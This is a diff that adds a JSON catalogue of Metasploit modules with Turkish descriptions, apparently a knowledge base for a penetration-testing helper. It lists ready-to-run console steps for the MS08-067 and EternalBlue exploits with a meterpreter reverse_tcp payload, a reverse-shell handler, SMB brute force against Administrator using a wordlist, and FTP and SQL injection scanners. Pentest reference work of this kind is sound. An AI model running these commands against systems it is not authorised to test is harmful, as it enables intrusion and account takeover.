@@ -1,0 +1,115 @@
+{
+    "ms08_067_netapi": {
+        "type": "exploit",
+        "category": "Windows SMB",
+        "path": "exploit/windows/smb/ms08_067_netapi",
+        "desc": "Windows Server Service NetAPI Buffer Overflow",
+        "cve": "CVE-2008-4250",
+        "target_os": "Windows XP/Server 2003/Vista",
+        "severity": "Critical",
+        "default_payload": "windows/meterpreter/reverse_tcp",
+        "required_params": {
+            "RHOST": "Hedef IP adresi",
+            "LHOST": "Listener IP adresi"
+        },
+        "usage": [
+            "use exploit/windows/smb/ms08_067_netapi",
+            "set RHOST 192.168.23.130",
+            "set LHOST 192.168.23.128",
+            "exploit"
+        ],
+        "note": "Çok yaygın kullanılan kritik Windows zafiyeti"
+    },
+    "ms17_010_eternalblue": {
+        "type": "exploit", 
+        "category": "Windows SMB",
+        "path": "exploit/windows/smb/ms17_010_eternalblue",
+        "desc": "MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption",
+        "cve": "CVE-2017-0144",
+        "target_os": "Windows 7/8.1/10/Server 2008/2012/2016",
+        "severity": "Critical",
+        "usage": [
+            "use exploit/windows/smb/ms17_010_eternalblue",
+            "set RHOST <Hedef_IP>",
+            "run"
+        ],
+        "note": "WannaCry saldırısında kullanılan zafiyet"
+    },
+    "multi_handler": {
+        "type": "exploit",
+        "category": "Generic",
+        "path": "exploit/multi/handler",
+        "desc": "Generic payload handler",
+        "usage": [
+            "use exploit/multi/handler",
+            "set payload <payload_type>",
+            "set LHOST <listener_ip>",
+            "set LPORT <listener_port>",
+            "run"
+        ],
+        "note": "Reverse shell bağlantıları için genel handler"
+    },
+    "ftp_anonymous": {
+        "type": "auxiliary",
+        "category": "Scanner",
+        "path": "auxiliary/scanner/ftp/anonymous",
+        "desc": "FTP anonim giriş kontrolü yapar",
+        "usage": [
+            "use auxiliary/scanner/ftp/anonymous",
+            "set RHOSTS <Hedef_IP>",
+            "run"
+        ],
+        "note": "FTP sunucularında anonim erişim testi"
+    },
+    "smb_login": {
+        "type": "auxiliary",
+        "category": "Scanner",
+        "path": "auxiliary/scanner/smb/smb_login",
+        "desc": "SMB protokolü brute force saldırısı",
+        "usage": [
+            "use auxiliary/scanner/smb/smb_login",
+            "set RHOSTS 172.20.1.90",
+            "set SMBUser Administrator", 
+            "set PASS_FILE /usr/share/wordlists/rockyou.txt",
+            "run"
+        ],
+        "required_params": {
+            "RHOSTS": "Hedef IP adresi",
+            "SMBUser": "Kullanıcı adı",
+            "PASS_FILE": "Şifre listesi dosyası"
+        },
+        "note": "SMB kullanıcı hesaplarına brute force"
+    },
+    "http_sql_injection": {
+        "type": "auxiliary",
+        "category": "Scanner",
+        "path": "auxiliary/scanner/http/sql_injection",
+        "desc": "HTTP SQL injection zafiyet taraması",
+        "usage": [
+            "use auxiliary/scanner/http/sql_injection",
+            "set RHOSTS <Hedef_IP>",
+            "set TARGETURI /login.php",
+            "run"
+        ],
+        "required_params": {
+            "RHOSTS": "Hedef IP adresi",
+            "TARGETURI": "Hedef URI"
+        },
+        "note": "Web uygulamalarında SQL injection testi"
+    },
+    "db_commands": {
+        "type": "database",
+        "category": "Data Management",
+        "commands": {
+            "db_import": "XML dosyasını veritabanına aktarır",
+            "services": "Keşfedilen servisleri listeler",
+            "hosts": "Keşfedilen hostları listeler"
+        },
+        "usage": [
+            "db_import rapor.xml",
+            "services -S http",
+            "hosts -c address,os_name"
+        ],
+        "note": "Nmap sonuçlarını Metasploit'e aktarma"
+    }
+}
